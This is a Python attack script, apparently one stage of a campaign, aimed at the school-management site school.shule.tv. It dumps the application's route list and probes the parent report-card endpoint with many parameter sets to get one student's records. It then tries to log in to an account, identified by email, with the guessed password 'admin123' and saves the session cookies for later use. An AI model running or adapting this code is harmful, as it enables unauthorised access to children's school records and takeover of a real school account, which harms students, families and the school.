#!/usr/bin/env python3
"""
PHASE 3: REPORT CARD BREAKTHROUGH + ROUTE DUMP + LOGIN
Target: school.shule.tv
"""
import requests
import json
import re
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import unquote, quote
import urllib3
urllib3.disable_warnings()

BASE = "https://school.shule.tv"
OUTPUT = "orion_phase3_results.json"

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

def get_csrf():
    """Get fresh CSRF token"""
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    s.get(f"{BASE}/sanctum/csrf-cookie", timeout=10)
    token = ""
    if "XSRF-TOKEN" in s.cookies:
        token = unquote(s.cookies["XSRF-TOKEN"])
    return token, s.cookies

print("=" * 70)
print(" PHASE 3: REPORT CARD EXPLOIT + ROUTE LIST + LOGIN")
print("=" * 70)

# ── PART 1: RAW HOMEPAGE HTML WITH data-page ──
print("\n[ PART 1: EXTRACT data-page & ROUTES ]")
r = requests.get(f"{BASE}/", timeout=15, 
                 headers={"User-Agent": "Mozilla/5.0"})
raw = r.text

# Find all data-page occurrences
dp_matches = re.findall(r'data-page=(["\'])(.*?)\1', raw, re.DOTALL)
print(f"  Found {len(dp_matches)} data-page attribute(s)")

all_routes = {}
for idx, (quote_char, dp_content) in enumerate(dp_matches):
    # Unescape HTML entities
    dp = dp_content.replace("&quot;", '"').replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
    dp = dp.replace("&#039;", "'")
    
    try:
        dp_json = json.loads(dp)
        ziggy = dp_json.get("ziggy", {})
        routes = ziggy.get("routes", {})
        
        if routes:
            print(f"\n  [data-page #{idx+1}] Found {len(routes)} routes!")
            all_routes.update(routes)
            
            # Categorize
            report_routes = {k: v for k, v in routes.items() if any(x in k.lower() for x in 
                             ["report", "mark", "grade", "result", "card", "exam", "term", 
                              "assessment", "transcript", "pdf", "print", "download"])}
            auth_routes = {k: v for k, v in routes.items() if any(x in k.lower() for x in 
                          ["login", "logout", "register", "password", "auth", "sanctum", 
                           "csrf", "verify", "forgot", "reset"])}
            api_routes = {k: v for k, v in routes.items() if "api" in k.lower() or "/api/" in v.get("uri", "")}
            admin_routes = {k: v for k, v in routes.items() if any(x in k.lower() for x in 
                            ["admin", "dashboard", "backup", "setting", "config", "user", 
                             "role", "permission", "import", "export"])}
            
            print(f"  ├─ Report/Marks: {len(report_routes)}")
            print(f"  ├─ Auth: {len(auth_routes)}")
            print(f"  ├─ API: {len(api_routes)}")
            print(f"  ├─ Admin: {len(admin_routes)}")
            
            # Print report routes
            if report_routes:
                print(f"\n  ── REPORT/MARKS ROUTES ──")
                for name, info in sorted(report_routes.items()):
                    print(f"    {name} → {info.get('uri')} [{','.join(info.get('methods',['GET']))}]")
            
            # Print auth routes
            if auth_routes:
                print(f"\n  ── AUTH ROUTES ──")
                for name, info in sorted(auth_routes.items()):
                    print(f"    {name} → {info.get('uri')} [{','.join(info.get('methods',['GET']))}]")
            
            # Print admin routes
            if admin_routes:
                print(f"\n  ── ADMIN ROUTES ──")
                for name, info in sorted(admin_routes.items()):
                    print(f"    {name} → {info.get('uri')} [{','.join(info.get('methods',['GET']))}]")
    
    except json.JSONDecodeError as e:
        # Save snippet for manual inspection
        with open(f"orion_data_page_{idx}.txt", "w") as f:
            f.write(dp[:10000])
        print(f"  [data-page #{idx+1}] JSON parse error: {e} — saved snippet")

# Save all routes
if all_routes:
    with open("orion_all_routes.json", "w") as f:
        json.dump(all_routes, f, indent=2)
    print(f"\n  ✅ All {len(all_routes)} routes saved to orion_all_routes.json")

# ── PART 2: Try report endpoint with X-Inertia headers ──
print("\n\n[ PART 2: REPORT CARD WITH X-Inertia HEADER ]")

# From validation errors: school_id, admission_number, student_id are required
# class_id might also be needed

# Get student data to find class_id for student 3018
r_student = session.get(f"{BASE}/parent-report-card/student", 
                        params={"school_id": 18, "admission_number": "ADM20260001"},
                        timeout=10)
print(f"\n  GET student 3018 → {r_student.status_code}")
if r_student.status_code == 200:
    sdata = r_student.json()
    class_id = sdata.get("data", {}).get("class", {}).get("id") or sdata.get("data", {}).get("class_id")
    print(f"  Student class_id: {class_id}")

# Now try report with X-Inertia
s2 = requests.Session()
s2.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "X-Inertia": "true",
    "X-Inertia-Version": "2",
    "Accept": "text/html, application/xhtml+xml",
    "Referer": f"{BASE}/",
})

# Try various parameter combinations
params_to_try = [
    {"school_id": 18, "admission_number": "ADM20260001", "student_id": 3018},
    {"school_id": 18, "admission_number": "ADM20260001", "student_id": 3018, "class_id": 1},
    {"school_id": 18, "admission_number": "ADM20260001", "student_id": 3018, "class_id": 1, "term": 1},
    {"school_id": 18, "admission_number": "ADM20260001", "student_id": 3018, "class_id": 1, "term": 1, "year": 2026},
    {"school_id": 18, "admission_number": "ADM20260001", "student_id": 3018, "term": 1, "year": 2026},
    {"school_id": 18, "admission_number": "ADM20260001", "term": 1},
    {"school_id": 18, "admission_number": "ADM20260001", "term_id": 1, "year_id": 2026},
]

for params in params_to_try:
    try:
        r = s2.get(f"{BASE}/parent-report-card/report", params=params, timeout=10)
        status = r.status_code
        if status == 200:
            print(f"\n  ✅ [{status}] {params}")
            try:
                data = r.json()
                print(f"  DATA: {json.dumps(data, indent=2)[:2000]}")
            except:
                print(f"  RAW: {r.text[:500]}")
        elif status == 422:
            try:
                errs = r.json()
                print(f"\n  [422] {params}")
                msg = errs.get("message", "")
                print(f"  Message: {msg}")
            except:
                print(f"\n  [422] {params} → {r.text[:200]}")
        elif status not in [401, 404]:
            print(f"\n  [{status}] {params} → {r.text[:150]}")
    except Exception as e:
        print(f"\n  ERROR: {e}")

# ── PART 3: Inertia POST login ──
print("\n\n[ PART 3: INERTIA LOGIN TEST ]")
print("  Login needs: X-Inertia header + CSRF token + form data")
print("  Video says: choose school → enter username → enter password")
print("  Login component likely sends: school_id, email, password")

# Get CSRF and session cookies
csrf_token, cookies = get_csrf()
print(f"\n  CSRF obtained: {csrf_token[:40]}...")

# Set up session with cookies + headers
s3 = requests.Session()
for cookie_name, cookie_value in cookies.items():
    s3.cookies.set(cookie_name, cookie_value)
s3.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "X-Inertia": "true",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "text/html, application/xhtml+xml",
    "Content-Type": "application/json",
    "X-XSRF-TOKEN": csrf_token,
    "Referer": f"{BASE}/",
})

# Try login with school_id
login_payloads = [
    {"email": "twinbrothersnursch@gmail.com", "password": "admin123", "school_id": 18},
    {"email": "twinbrothersnursch@gmail.com", "password": "admin123", "school_id": "18"},
    {"email": "twinbrothersnursch@gmail.com", "password": "admin123"},
    {"email": "twinbrothersnursch@gmail.com", "password": "admin123", "school": 18},
]

for payload in login_payloads:
    try:
        r = s3.post(f"{BASE}/", json=payload, timeout=10, allow_redirects=False)
        print(f"\n  POST / → {r.status_code}")
        print(f"  Payload: {payload}")
        if r.status_code == 302:
            print(f"  Location: {r.headers.get('Location')}")
            if "dashboard" in r.headers.get("Location","").lower() or "home" in r.headers.get("Location","").lower():
                print("  ✅ LOGIN SUCCESSFUL!")
                with open("orion_cookies.txt", "w") as f:
                    f.write(json.dumps(dict(s3.cookies), indent=2))
                print("  Cookies saved to orion_cookies.txt")
        elif r.status_code == 200:
            print(f"  Response: {r.text[:300]}")
            if '"component"' in r.text:
                comp = re.search(r'"component"\s*:\s*"([^"]+)"', r.text)
                if comp:
                    print(f"  Inertia component: {comp.group(1)}")
                    if "Dashboard" in comp.group(1) or "Home" in comp.group(1):
                        print("  ✅ LOGIN SUCCESSFUL (Inertia response)!")
            # Check for errors
            if "message" in r.text:
                msg = re.search(r'"message"\s*:\s*"([^"]+)"', r.text)
                if msg:
                    print(f"  Message: {msg.group(1)}")
        elif r.status_code == 419:
            print("  CSRF token expired!")
            # Refresh CSRF
            csrf_token, cookies = get_csrf()
            s3.cookies.update(cookies)
            s3.headers["X-XSRF-TOKEN"] = csrf_token
    except Exception as e:
        print(f"  ERROR: {e}")

print("\n" + "=" * 70)
print(" PHASE 3 RESULTS SAVED")
print("=" * 70)
print(f"  - Routes: orion_all_routes.json")
print(f"  - Full results: {OUTPUT}")